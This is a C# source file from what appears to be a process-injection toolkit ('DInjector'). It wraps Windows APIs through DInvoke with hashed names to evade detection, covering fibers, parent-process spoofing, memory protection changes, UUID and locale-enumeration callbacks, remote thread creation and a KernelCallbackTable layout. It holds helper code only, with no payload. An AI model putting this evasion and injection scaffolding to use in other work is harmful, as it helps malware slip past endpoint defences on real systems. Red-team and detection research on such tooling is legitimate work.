using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;
using static DInvoke.DynamicInvoke.Generic;

namespace DInjector
{
    class Win32
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocExNuma(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect,
            UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);

        public static IntPtr ConvertThreadToFiber(IntPtr lpParameter)
        {
            object[] parameters = { lpParameter };
            // { API_HASHING:ConvertThreadToFiber }
            var result = (IntPtr)DynamicAPIInvoke("kernel32.dll", "1216fc3cffbb970a58f1edd3f2acf585", typeof(Delegates.ConvertThreadToFiber), ref parameters, 0x8d16b8ff);

            return result;
        }

        public static IntPtr CreateFiber(uint dwStackSize, Delegate lpStartAddress, IntPtr lpParameter)
        {
            object[] parameters = { dwStackSize, lpStartAddress, lpParameter };
            // { API_HASHING:CreateFiber }
            var result = (IntPtr)DynamicAPIInvoke("kernel32.dll", "827cec2087b74d501f2231a59dcbc4b4", typeof(Delegates.CreateFiber), ref parameters, 0x55f08035);

            return result;
        }

        public static void SwitchToFiber(IntPtr lpFiber)
        {
            object[] parameters = { lpFiber };
            // { API_HASHING:SwitchToFiber }
            _ = DynamicAPIInvoke("kernel32.dll", "1e8936e6cc420d5bf1d18c73e5d531e7", typeof(Delegates.SwitchToFiber), ref parameters, 0x32bac938);
        }

        public static void DeleteFiber(IntPtr lpFiber)
        {
            object[] parameters = { lpFiber };
            // { API_HASHING:DeleteFiber }
            _ = DynamicAPIInvoke("kernel32.dll", "b69d56ecb047ac954e0f63f16e6d8988", typeof(Delegates.DeleteFiber), ref parameters, 0xb6dcd546);
        }

        public static bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, ref IntPtr lpSize)
        {
            object[] parameters = { lpAttributeList, dwAttributeCount, 0, lpSize };
            // { API_HASHING:InitializeProcThreadAttributeList }
            var result = (bool)DynamicAPIInvoke("kernel32.dll", "f267cb2a9983230b7176eefdbb781596", typeof(Delegates.InitializeProcThreadAttributeList), ref parameters, 0x2660a352);

            lpSize = (IntPtr)parameters[3];
            return result;
        }

        public static bool UpdateProcThreadAttribute(IntPtr lpAttributeList, IntPtr attribute, IntPtr lpValue)
        {
            object[] parameters = { lpAttributeList, (uint)0, attribute, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero };
            // { API_HASHING:UpdateProcThreadAttribute }
            var result = (bool)DynamicAPIInvoke("kernel32.dll", "a30edff1ea7cccdd247ee13234aec688", typeof(Delegates.UpdateProcThreadAttribute), ref parameters, 0xdc849ae2);

            return result;
        }

        public static bool DeleteProcThreadAttributeList(IntPtr lpAttributeList)
        {
            object[] parameters = { lpAttributeList };
            // { API_HASHING:DeleteProcThreadAttributeList }
            var result = (bool)DynamicAPIInvoke("kernel32.dll", "a3bd64b7d397bd37303c095fe040c310", typeof(Delegates.DeleteProcThreadAttributeList), ref parameters, 0x752b17f8);

            return result;
        }

        public static bool CreateProcessA(string applicationName, string workingDirectory, uint creationFlags, DI.Data.Win32.ProcessThreadsAPI._STARTUPINFOEX startupInfoEx, out DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION processInformation)
        {
            var pa = new DI.Data.Win32.WinBase.SECURITY_ATTRIBUTES();
            var ta = new DI.Data.Win32.WinBase.SECURITY_ATTRIBUTES();
            var pi = new DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION();

            object[] parameters = { applicationName, null, pa, ta, false, creationFlags, IntPtr.Zero, workingDirectory, startupInfoEx, pi };
            // { API_HASHING:CreateProcessA }
            var result = (bool)DynamicAPIInvoke("kernel32.dll", "f0e8685e4b0652838037a6ffc3a69373", typeof(Delegates.CreateProcessA), ref parameters, 0x3e3a27d6);

            if (!result) throw new Win32Exception(Marshal.GetLastWin32Error());
            processInformation = (DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION)parameters[9];

            return result;
        }

        public static bool GetModuleInformation(IntPtr hProcess, IntPtr hModule, out MODULEINFO lpmodinfo, uint cb)
        {
            MODULEINFO mi = new MODULEINFO();

            object[] parameters = { hProcess, hModule, mi, cb };
            // { API_HASHING:GetModuleInformation }
            var result = (bool)DynamicAPIInvoke("psapi.dll", "f1bcfdcc4a84eb8e090f63e6d90cc916", typeof(Delegates.GetModuleInformation), ref parameters, 0x714aff41);

            if (!result) throw new Win32Exception(Marshal.GetLastWin32Error());
            lpmodinfo = (MODULEINFO)parameters[2];

            return result;
        }

        public static bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            uint oldProtect = 0;

            object[] parameters = { lpAddress, dwSize, flNewProtect, oldProtect };
            // { API_HASHING:VirtualProtect }
            var result = (bool)DynamicAPIInvoke("kernel32.dll", "bd30b0a4dd036edfb2decd756d633b08", typeof(Delegates.VirtualProtect), ref parameters, 0x34637402);

            if (!result) throw new Win32Exception(Marshal.GetLastWin32Error());
            lpflOldProtect = (uint)parameters[3];

            return result;
        }

        public static uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds)
        {
            object[] parameters = { hHandle, dwMilliseconds };
            // { API_HASHING:WaitForSingleObject }
            var result = (uint)DynamicAPIInvoke("kernel32.dll", "690ac6143d547fe6a2c054789b756200", typeof(Delegates.WaitForSingleObject), ref parameters, 0xb60468e4);

            return result;
        }

        public static void CopyMemory(IntPtr destination, IntPtr source, uint length)
        {
            object[] parameters = { destination, source, length };
            // { API_HASHING:CopyMemory }
            _ = DynamicAPIInvoke("kernel32.dll", "e1411d8bd174151daf065d9997ee77d3", typeof(Delegates.CopyMemory), ref parameters, 0x469682a8);
        }

        public static bool OpenClipboard(IntPtr hWndNewOwner)
        {
            object[] parameters = { hWndNewOwner };
            // { API_HASHING:OpenClipboard }
            var result = (bool)DynamicAPIInvoke("user32.dll", "ba4d19d1795d149674d8a853a4f1e2c8", typeof(Delegates.OpenClipboard), ref parameters, 0x67510e65);

            return result;
        }

        public static IntPtr SetClipboardData(uint uFormat, byte[] hMem)
        {
            object[] parameters = { uFormat, hMem };
            // { API_HASHING:SetClipboardData }
            var result = (IntPtr)DynamicAPIInvoke("user32.dll", "28a9cc85584f49ec43e722b7f599e9d6", typeof(Delegates.SetClipboardData), ref parameters, 0xaa6e04e5);

            return result;
        }

        public static bool CloseClipboard()
        {
            object[] parameters = { };
            // { API_HASHING:CloseClipboard }
            var result = (bool)DynamicAPIInvoke("user32.dll", "b6d37a92ef02f380d11d436b7d28372f", typeof(Delegates.CloseClipboard), ref parameters, 0x6222afde);

            return result;
        }

        public static IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize)
        {
            object[] parameters = { flOptions, dwInitialSize, dwMaximumSize };
            // { API_HASHING:HeapCreate }
            var result = (IntPtr)DynamicAPIInvoke("kernel32.dll", "9cffc3633da0558b31368fb0537ae128", typeof(Delegates.HeapCreate), ref parameters, 0x9ff75be9);

            return result;
        }

        public static IntPtr UuidFromStringA(string stringUuid, IntPtr heapPointer)
        {
            object[] parameters = { stringUuid, heapPointer };
            // { API_HASHING:UuidFromStringA }
            var result = (IntPtr)DynamicAPIInvoke("rpcrt4.dll", "75ce368b933fef1faf2da8f7cc4454e1", typeof(Delegates.UuidFromStringA), ref parameters, 0x2993edfb);

            return result;
        }

        public static bool EnumSystemLocalesA(IntPtr lpLocaleEnumProc, int dwFlags)
        {
            object[] parameters = { lpLocaleEnumProc, dwFlags };
            // { API_HASHING:EnumSystemLocalesA }
            var result = (bool)DynamicAPIInvoke("kernel32.dll", "bebd3883fc183bb68c4d7cc1cf7e5777", typeof(Delegates.EnumSystemLocalesA), ref parameters, 0x6af2bae6);

            return result;
        }

        public static bool EnumTimeFormatsEx(IntPtr lpTimeFmtEnumProcEx, IntPtr lpLocaleName, uint dwFlags, uint lParam)
        {
            object[] parameters = { lpTimeFmtEnumProcEx, lpLocaleName, dwFlags, lParam };
            // { API_HASHING:EnumTimeFormatsEx }
            var result = (bool)DynamicAPIInvoke("kernel32.dll", "0247d880e2986573820b5de3b4bee4ad", typeof(Delegates.EnumTimeFormatsEx), ref parameters, 0x26febf25);

            return result;
        }

        public static uint WaitForInputIdle(IntPtr hProcess, uint dwMilliseconds)
        {
            object[] parameters = { hProcess, dwMilliseconds };
            // { API_HASHING:WaitForInputIdle }
            var result = (uint)DynamicAPIInvoke("user32.dll", "da0a744b862f2edfa3ce0df7578cacc1", typeof(Delegates.WaitForInputIdle), ref parameters, 0xacb247e6);

            return result;
        }

        public static IntPtr FindWindowExA(IntPtr parentHandle, IntPtr hWndChildAfter, string className, string windowTitle)
        {
            object[] parameters = { parentHandle, hWndChildAfter, className, windowTitle };
            // { API_HASHING:FindWindowExA }
            var result = (IntPtr)DynamicAPIInvoke("user32.dll", "eac314785accc5dec13fc9205449ca64", typeof(Delegates.FindWindowExA), ref parameters, 0xdeb96a2d);

            return result;
        }

        public static IntPtr SendMessageA(IntPtr hWnd, uint Msg, IntPtr wParam, ref Win32.COPYDATASTRUCT lParam)
        {
            object[] parameters = { hWnd, Msg, wParam, lParam };
            // { API_HASHING:SendMessageA }
            var result = (IntPtr)DynamicAPIInvoke("user32.dll", "88c872ff2ad51d4f99d3418c47cbee81", typeof(Delegates.SendMessageA), ref parameters, 0x3cc4697);

            return result;
        }

        public static NTSTATUS RtlCreateUserThread(IntPtr ProcessHandle, IntPtr ThreadSecurity, bool CreateSuspended, Int32 StackZeroBits, IntPtr StackReserved, IntPtr StackCommit, IntPtr StartAddress, IntPtr Parameter, ref IntPtr ThreadHandle, IntPtr ClientId)
        {
            object[] parameters = { ProcessHandle, ThreadSecurity, CreateSuspended, StackZeroBits, StackReserved, StackCommit, StartAddress, Parameter, ThreadHandle, ClientId };
            // { API_HASHING:RtlCreateUserThread }
            var result = (NTSTATUS)DynamicAPIInvoke("ntdll.dll", "fdd1f4448013d49c492c0b301b19d809", typeof(Delegates.RtlCreateUserThread), ref parameters, 0xe8d8361e);

            ThreadHandle = (IntPtr)parameters[8];
            return result;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MODULEINFO
        {
            public IntPtr lpBaseOfDll;
            public uint SizeOfImage;
            public IntPtr EntryPoint;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct KernelCallBackTable
        {
            public IntPtr fnCOPYDATA;
            public IntPtr fnCOPYGLOBALDATA;
            public IntPtr fnDWORD;
            public IntPtr fnNCDESTROY;
            public IntPtr fnDWORDOPTINLPMSG;
            public IntPtr fnINOUTDRAG;
            public IntPtr fnGETTEXTLENGTHS;
            public IntPtr fnINCNTOUTSTRING;
            public IntPtr fnPOUTLPINT;
            public IntPtr fnINLPCOMPAREITEMSTRUCT;
            public IntPtr fnINLPCREATESTRUCT;
            public IntPtr fnINLPDELETEITEMSTRUCT;
            public IntPtr fnINLPDRAWITEMSTRUCT;
            public IntPtr fnPOPTINLPUINT;
            public IntPtr fnPOPTINLPUINT2;
            public IntPtr fnINLPMDICREATESTRUCT;
            public IntPtr fnINOUTLPMEASUREITEMSTRUCT;
            public IntPtr fnINLPWINDOWPOS;
            public IntPtr fnINOUTLPPOINT5;
            public IntPtr fnINOUTLPSCROLLINFO;
            public IntPtr fnINOUTLPRECT;
            public IntPtr fnINOUTNCCALCSIZE;
            public IntPtr fnINOUTLPPOINT5_;
            public IntPtr fnINPAINTCLIPBRD;
            public IntPtr fnINSIZECLIPBRD;
            public IntPtr fnINDESTROYCLIPBRD;
            public IntPtr fnINSTRING;
            public IntPtr fnINSTRINGNULL;
            public IntPtr fnINDEVICECHANGE;
            public IntPtr fnPOWERBROADCAST;
            public IntPtr fnINLPUAHDRAWMENU;
            public IntPtr fnOPTOUTLPDWORDOPTOUTLPDWORD;
            public IntPtr fnOPTOUTLPDWORDOPTOUTLPDWORD_;
            public IntPtr fnOUTDWORDINDWORD;
            public IntPtr fnOUTLPRECT;
            public IntPtr fnOUTSTRING;
            public IntPtr fnPOPTINLPUINT3;
            public IntPtr fnPOUTLPINT2;
            public IntPtr fnSENTDDEMSG;
            public IntPtr fnINOUTSTYLECHANGE;
            public IntPtr fnHkINDWORD;
            public IntPtr fnHkINLPCBTACTIVATESTRUCT;
            public IntPtr fnHkINLPCBTCREATESTRUCT;
            public IntPtr fnHkINLPDEBUGHOOKSTRUCT;
            public IntPtr fnHkINLPMOUSEHOOKSTRUCTEX;
            public IntPtr fnHkINLPKBDLLHOOKSTRUCT;
            public IntPtr fnHkINLPMSLLHOOKSTRUCT;
            public IntPtr fnHkINLPMSG;
            public IntPtr fnHkINLPRECT;
            public IntPtr fnHkOPTINLPEVENTMSG;
            public IntPtr xxxClientCallDelegateThread;
            public IntPtr ClientCallDummyCallback;
            public IntPtr fnKEYBOARDCORRECTIONCALLOUT;
            public IntPtr fnOUTLPCOMBOBOXINFO;
            public IntPtr fnINLPCOMPAREITEMSTRUCT2;
            public IntPtr xxxClientCallDevCallbackCapture;
            public IntPtr xxxClientCallDitThread;
            public IntPtr xxxClientEnableMMCSS;
            public IntPtr xxxClientUpdateDpi;
            public IntPtr xxxClientExpandStringW;
            public IntPtr ClientCopyDDEIn1;
            public IntPtr ClientCopyDDEIn2;
            public IntPtr ClientCopyDDEOut1;
            public IntPtr ClientCopyDDEOut2;
            public IntPtr ClientCopyImage;
            public IntPtr ClientEventCallback;
            public IntPtr ClientFindMnemChar;
            public IntPtr ClientFreeDDEHandle;
            public IntPtr ClientFreeLibrary;
            public IntPtr ClientGetCharsetInfo;
            public IntPtr ClientGetDDEFlags;
            public IntPtr ClientGetDDEHookData;
            public IntPtr ClientGetListboxString;
            public IntPtr ClientGetMessageMPH;
            public IntPtr ClientLoadImage;
            public IntPtr ClientLoadLibrary;
            public IntPtr ClientLoadMenu;
            public IntPtr ClientLoadLocalT1Fonts;
            public IntPtr ClientPSMTextOut;
            public IntPtr ClientLpkDrawTextEx;
            public IntPtr ClientExtTextOutW;
            public IntPtr ClientGetTextExtentPointW;
            public IntPtr ClientCharToWchar;
            public IntPtr ClientAddFontResourceW;
            public IntPtr ClientThreadSetup;
            public IntPtr ClientDeliverUserApc;
            public IntPtr ClientNoMemoryPopup;
            public IntPtr ClientMonitorEnumProc;
            public IntPtr ClientCallWinEventProc;
            public IntPtr ClientWaitMessageExMPH;
            public IntPtr ClientWOWGetProcModule;
            public IntPtr ClientWOWTask16SchedNotify;
            public IntPtr ClientImmLoadLayout;
            public IntPtr ClientImmProcessKey;
            public IntPtr fnIMECONTROL;
            public IntPtr fnINWPARAMDBCSCHAR;
            public IntPtr fnGETTEXTLENGTHS2;
            public IntPtr fnINLPKDRAWSWITCHWND;
            public IntPtr ClientLoadStringW;
            public IntPtr ClientLoadOLE;
            public IntPtr ClientRegisterDragDrop;
            public IntPtr ClientRevokeDragDrop;
            public IntPtr fnINOUTMENUGETOBJECT;
            public IntPtr ClientPrinterThunk;
            public IntPtr fnOUTLPCOMBOBOXINFO2;
            public IntPtr fnOUTLPSCROLLBARINFO;
            public IntPtr fnINLPUAHDRAWMENU2;
            public IntPtr fnINLPUAHDRAWMENUITEM;
            public IntPtr fnINLPUAHDRAWMENU3;
            public IntPtr fnINOUTLPUAHMEASUREMENUITEM;
            public IntPtr fnINLPUAHDRAWMENU4;
            public IntPtr fnOUTLPTITLEBARINFOEX;
            public IntPtr fnTOUCH;
            public IntPtr fnGESTURE;
            public IntPtr fnPOPTINLPUINT4;
            public IntPtr fnPOPTINLPUINT5;
            public IntPtr xxxClientCallDefaultInputHandler;
            public IntPtr fnEMPTY;
            public IntPtr ClientRimDevCallback;
            public IntPtr xxxClientCallMinTouchHitTestingCallback;
            public IntPtr ClientCallLocalMouseHooks;
            public IntPtr xxxClientBroadcastThemeChange;
            public IntPtr xxxClientCallDevCallbackSimple;
            public IntPtr xxxClientAllocWindowClassExtraBytes;
            public IntPtr xxxClientFreeWindowClassExtraBytes;
            public IntPtr fnGETWINDOWDATA;
            public IntPtr fnINOUTSTYLECHANGE2;
            public IntPtr fnHkINLPMOUSEHOOKSTRUCTEX2;
        }

        // https://github.com/vxunderground/VXUG-Papers/blob/c3bd670c45223baf0af8bfb795d688a104cd0197/Hells%20Gate/C%23%20Implementation/SharpHellsGate/Win32/Structures.cs#L121-L126
        // https://gist.github.com/gigajew/26ad60ea4167341407c064888dba8bf3#file-ntdonutloader-cs-L122-L149
        // https://stackoverflow.com/a/683810/6253579
        [StructLayout(LayoutKind.Explicit, Size = 1)]
        public struct LARGE_INTEGER
        {
            [FieldOffset(0)] public Int64 QuadPart;
            [FieldOffset(0)] public UInt32 LowPart;
            [FieldOffset(4)] public UInt32 HighPart;
        }

        public const uint WM_COPYDATA = 0x4A;

        public struct COPYDATASTRUCT
        {
            public IntPtr dwData;
            public int cbData;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpData;
        }
    }
}